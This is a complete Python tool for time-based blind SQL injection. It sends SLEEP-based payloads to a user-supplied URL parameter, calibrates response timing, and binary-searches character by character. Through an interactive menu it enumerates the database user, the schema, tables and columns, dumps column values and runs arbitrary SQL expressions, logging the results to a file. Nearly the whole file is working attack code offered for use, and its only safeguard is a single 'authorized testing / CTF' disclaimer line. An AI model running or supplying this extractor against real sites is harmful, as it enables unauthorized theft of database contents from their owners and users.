#!/usr/bin/env python3
"""
Time-Based Blind SQLi Extractor (robust edition)
------------------------------------------------
Pure time-based (SLEEP) blind SQL injection. Every question we ask the DB is
answered ONLY by how long the response takes:

    payload = 1' AND IF((<condition>), SLEEP(DELAY), 0)-- -

    - condition TRUE  -> DB sleeps -> response is SLOW
    - condition FALSE -> no sleep  -> response is FAST

Because time-based extraction is fragile on noisy networks (a slow packet can
look like a SLEEP and give you a wrong character), this version adds:

  1. Baseline calibration  - measures the normal (FALSE) response time first.
  2. Adaptive threshold     - TRUE means "clearly slower than baseline", not a
                              fixed magic number.
  3. Multi-sample voting    - borderline answers are re-asked a few times and
                              decided by majority, so one laggy request can't
                              flip a bit.
  4. Binary search          - ~7 requests per character instead of up to 95.

Usage: run it, paste your URL (with the injectable param in it), pick a menu
option.  s are appended to result.txt next to this script.

For authorized security testing / CTF / lab use only.
"""

import requests
import time
import sys
import os
import statistics
from datetime import datetime
from urllib.parse import quote

# result.txt lives next to this script regardless of the current directory
LOG_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "result.txt")


def log_result(label, value):
    """Append a timestamped result line to result.txt next to the script."""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    line = f"[{timestamp}] {label}: {value}\n"
    with open(LOG_PATH, "a", encoding="utf-8") as f:
        f.write(line)


# ---------------- Configuration ----------------
DELAY = 5                 # SLEEP() duration (seconds) used as the TRUE signal
REQUEST_TIMEOUT = DELAY + 10
MAX_STRING_LEN = 100
ASCII_MIN, ASCII_MAX = 32, 126   # printable range for binary search

# How many times to re-ask a borderline question before trusting the answer.
MAX_SAMPLES = 5
# A response counts as TRUE only if it is at least this fraction of DELAY
# slower than the measured baseline. Tuned in calibrate().
SAFETY_MARGIN = 0.5


class TimeBlindSQLi:
    def __init__(self, base_url, param="id"):
        self.base_url = base_url
        self.param = param
        self.session = requests.Session()
        self.last_db = None
        self.last_table = None
        # Learned during calibrate():
        self.baseline = 0.0        # normal (FALSE) response time in seconds
        self.threshold = DELAY * 0.6   # a response slower than this => TRUE

    # ---------------- low level ----------------

    def _time_request(self, condition):
        """Send one request for `condition` and return elapsed seconds.

        On timeout we assume SLEEP fired, so we return a value guaranteed to be
        counted as TRUE (baseline + DELAY). On other errors we return baseline
        so it is counted as FALSE.
        """
        payload = f"1' AND IF(({condition}),SLEEP({DELAY}),0)-- -"
        sep = "&" if "?" in self.base_url else "?"
        full_url = f"{self.base_url}{sep}{self.param}={quote(payload)}"
        try:
            start = time.time()
            self.session.get(full_url, timeout=REQUEST_TIMEOUT, verify=False)
            return time.time() - start
        except requests.exceptions.Timeout:
            return self.baseline + DELAY   # treat as TRUE
        except requests.RequestException:
            return self.baseline           # treat as FALSE

    def _is_true(self, elapsed):
        return elapsed >= self.threshold

    def _send(self, condition):
        """Ask one boolean question, using multi-sample voting on close calls.

        Fast path: if the first sample is clearly TRUE or clearly FALSE
        (far from the threshold), trust it and return immediately.
        Otherwise re-sample up to MAX_SAMPLES times and take the majority.
        """
        elapsed = self._time_request(condition)
        # "Clearly" = at least half of DELAY away from the decision line.
        clear_gap = DELAY * 0.5
        if abs(elapsed - self.threshold) >= clear_gap:
            return self._is_true(elapsed)

        # Borderline -> vote.
        votes = [self._is_true(elapsed)]
        while len(votes) < MAX_SAMPLES:
            votes.append(self._is_true(self._time_request(condition)))
            true_count = sum(votes)
            false_count = len(votes) - true_count
            # Early exit once one side can't be caught by the remaining votes.
            remaining = MAX_SAMPLES - len(votes)
            if true_count > false_count + remaining:
                return True
            if false_count > true_count + remaining:
                return False
        return sum(votes) > len(votes) / 2

    # ---------------- calibration ----------------

    def calibrate(self):
        """Measure normal response time (FALSE condition) and set the
        threshold so TRUE = 'clearly slower than baseline'."""
        print("[*] Calibrating baseline response time (FALSE condition)...")
        samples = []
        for _ in range(4):
            samples.append(self._time_request("1=2"))
        self.baseline = statistics.median(samples)
        # TRUE responses take about baseline + DELAY. Put the line partway up.
        self.threshold = self.baseline + DELAY * SAFETY_MARGIN
        print(f"    baseline ~= {self.baseline:.2f}s, "
              f"threshold set to {self.threshold:.2f}s "
              f"(TRUE ~= {self.baseline + DELAY:.2f}s)")

    def sanity_check(self):
        """Confirm SLEEP works: 1=1 should be slow, 1=2 should be fast."""
        self.calibrate()
        print("[*] Sanity check: 1=1 (should be slow)...")
        t1 = self._send("1=1")
        print(f"    -> {'SLOW (as expected)' if t1 else 'FAST (unexpected!)'}")

        print("[*] Sanity check: 1=2 (should be fast)...")
        t2 = self._send("1=2")
        print(f"    -> {'FAST (as expected)' if not t2 else 'SLOW (unexpected!)'}")

        ok = t1 and not t2
        if ok:
            print("[+] Time-based injection confirmed working.\n")
        else:
            print("[-] Something's off. Not injectable, WAF interference, or "
                  "DELAY/threshold needs tuning (try a bigger DELAY on a slow "
                  "target).\n")
        return ok

    # ---------------- extraction ----------------

    def get_length(self, expression, max_len=MAX_STRING_LEN):
        """Binary search the length of expression's string result."""
        lo, hi = 0, max_len
        while lo < hi:
            mid = (lo + hi) // 2
            if self._send(f"LENGTH(({expression}))>{mid}"):
                lo = mid + 1
            else:
                hi = mid
        return lo

    def get_char(self, expression, position):
        """Binary search a single character's ASCII code at `position`."""
        lo, hi = ASCII_MIN, ASCII_MAX
        while lo < hi:
            mid = (lo + hi) // 2
            cond = f"ASCII(SUBSTR(({expression}),{position},1))>{mid}"
            if self._send(cond):
                lo = mid + 1
            else:
                hi = mid
        return chr(lo)

    def _verify_char(self, expression, position, code):
        """Confirm a found char with a direct equality check."""
        return self._send(f"ASCII(SUBSTR(({expression}),{position},1))={code}")

    def extract(self, expression, label=""):
        length = self.get_length(expression)
        if length == 0:
            print(f"[{label}] (empty or no result)")
            log_result(label, "(empty or no result)")
            return ""
        print(f"[*] '{label}' length = {length}")
        result = ""
        for pos in range(1, length + 1):
            c = self.get_char(expression, pos)
            # Verify each character; if the equality check disagrees, retry once.
            if not self._verify_char(expression, pos, ord(c)):
                c = self.get_char(expression, pos)
            result += c
            sys.stdout.write(f"\r[{label}] {result}")
            sys.stdout.flush()
        print()
        log_result(label, result)
        return result

    # -------- high level helpers --------

    def user(self):
        return self.extract("SELECT user()", label="user()")

    def database(self):
        result = self.extract("SELECT database()", label="database()")
        if result:
            self.last_db = result
        return result

    def version(self):
        return self.extract("SELECT version()", label="version()")

    def table_count(self, db):
        expr = f"SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='{db}'"
        return self.extract(expr, label="table_count")

    def table_name(self, db, i):
        expr = (f"SELECT table_name FROM information_schema.tables "
                f"WHERE table_schema='{db}' LIMIT {i},1")
        result = self.extract(expr, label=f"table[{i}]")
        if result:
            self.last_table = result
        return result

    def column_count(self, db, table):
        expr = (f"SELECT COUNT(*) FROM information_schema.columns "
                f"WHERE table_schema='{db}' AND table_name='{table}'")
        return self.extract(expr, label="col_count")

    def column_name(self, db, table, i):
        expr = (f"SELECT column_name FROM information_schema.columns "
                f"WHERE table_schema='{db}' AND table_name='{table}' LIMIT {i},1")
        return self.extract(expr, label=f"col[{i}]")

    def row_count(self, table):
        expr = f"SELECT COUNT(*) FROM {table}"
        return self.extract(expr, label="row_count")

    def cell(self, table, column, i):
        expr = f"SELECT {column} FROM {table} LIMIT {i},1"
        return self.extract(expr, label=f"{table}.{column}[{i}]")


def full_auto(sqli):
    """Runs user() -> database() -> tables -> columns for each table,
    prints a full summary, and saves it to result.txt at the end."""
    summary = {}

    print("\n[*] Step 1/4: current user()...")
    summary["user"] = sqli.user()

    print("\n[*] Step 2/4: current database()...")
    db = sqli.database()
    summary["database"] = db

    if not db:
        print("[!] Could not determine database name. Stopping auto enumeration.")
        return

    print(f"\n[*] Step 3/4: tables in '{db}'...")
    try:
        n_tables = int(sqli.table_count(db))
    except ValueError:
        print("[!] Could not parse table count. Stopping.")
        return

    tables = []
    for i in range(n_tables):
        t = sqli.table_name(db, i)
        if t:
            tables.append(t)
    summary["tables"] = tables

    print(f"\n[*] Step 4/4: columns for each table...")
    summary["columns"] = {}
    for table in tables:
        try:
            n_cols = int(sqli.column_count(db, table))
        except ValueError:
            print(f"[!] Could not parse column count for '{table}', skipping.")
            continue
        cols = []
        for i in range(n_cols):
            c = sqli.column_name(db, table, i)
            if c:
                cols.append(c)
        summary["columns"][table] = cols

    # ---- Print full summary ----
    print("\n" + "=" * 50)
    print("FULL ENUMERATION SUMMARY")
    print("=" * 50)
    print(f"user()      : {summary['user']}")
    print(f"database()  : {summary['database']}")
    print(f"tables ({len(tables)}):")
    for t in tables:
        cols = summary["columns"].get(t, [])
        print(f"  - {t}  [{', '.join(cols) if cols else 'no columns found'}]")
    print("=" * 50)

    # ---- Save final summary block to result.txt ----
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(LOG_PATH, "a", encoding="utf-8") as f:
        f.write(f"\n[{timestamp}] ===== FULL ENUMERATION SUMMARY =====\n")
        f.write(f"user(): {summary['user']}\n")
        f.write(f"database(): {summary['database']}\n")
        for t in tables:
            cols = summary["columns"].get(t, [])
            f.write(f"table: {t} | columns: {', '.join(cols) if cols else '(none found)'}\n")
        f.write("=" * 50 + "\n")

    print(f"\n[+] Full summary saved to {LOG_PATH}")


def menu(sqli):
    while True:
        print("\n--- Menu ---")
        print("1) Current user()")
        print("2) Current database()")
        print("3) DB version()")
        print("4) List tables in a database")
        print("5) List columns in a table")
        print("6) Dump values from a column")
        print("7) Custom scalar expression")
        print("8) Full auto enumeration (user + db + tables + columns)")
        print("9) Re-calibrate timing (do this if results look wrong)")
        print("0) Exit")
        choice = input("> ").strip()

        if choice == "1":
            print("\nRESULT:", sqli.user())
        elif choice == "2":
            print("\nRESULT:", sqli.database())
        elif choice == "3":
            print("\nRESULT:", sqli.version())
        elif choice == "4":
            default = sqli.last_db or ""
            prompt = f"Database name [{default}]: " if default else "Database name: "
            db = input(prompt).strip() or default
            if not db:
                print("[!] No database name available.")
                continue
            try:
                n = int(sqli.table_count(db))
            except ValueError:
                print("[!] Could not parse table count.")
                continue
            print(f"\n[*] {n} tables found:")
            for i in range(n):
                sqli.table_name(db, i)
        elif choice == "5":
            default_db = sqli.last_db or ""
            prompt_db = f"Database name [{default_db}]: " if default_db else "Database name: "
            db = input(prompt_db).strip() or default_db
            default_table = sqli.last_table or ""
            prompt_table = f"Table name [{default_table}]: " if default_table else "Table name: "
            table = input(prompt_table).strip() or default_table
            if not db or not table:
                print("[!] Missing database or table name.")
                continue
            try:
                n = int(sqli.column_count(db, table))
            except ValueError:
                print("[!] Could not parse column count.")
                continue
            print(f"\n[*] {n} columns found:")
            for i in range(n):
                sqli.column_name(db, table, i)
        elif choice == "6":
            table = input("Table name: ").strip()
            column = input("Column name: ").strip()
            try:
                n = int(sqli.row_count(table))
            except ValueError:
                print("[!] Could not parse row count.")
                continue
            print(f"\n[*] {n} rows found:")
            for i in range(n):
                sqli.cell(table, column, i)
        elif choice == "7":
            expr = input("SQL scalar expression: ").strip()
            print("\nRESULT:", sqli.extract(expr, label="custom"))
        elif choice == "8":
            full_auto(sqli)
        elif choice == "9":
            sqli.calibrate()
        elif choice == "0":
            break
        else:
            print("Invalid choice")


def main():
    print("=== Time-Based Blind SQLi Extractor (robust edition) ===\n")
    url = input("Target URL (e.g. https://host/index.php?id=1): ").strip()
    param = input("Injectable parameter name [default: id]: ").strip() or "id"

    sqli = TimeBlindSQLi(url, param=param)

    if not sqli.sanity_check():
        proceed = input("Sanity check failed. Continue anyway? (y/n): ").strip().lower()
        if proceed != "y":
            return

    menu(sqli)


if __name__ == "__main__":
    main()
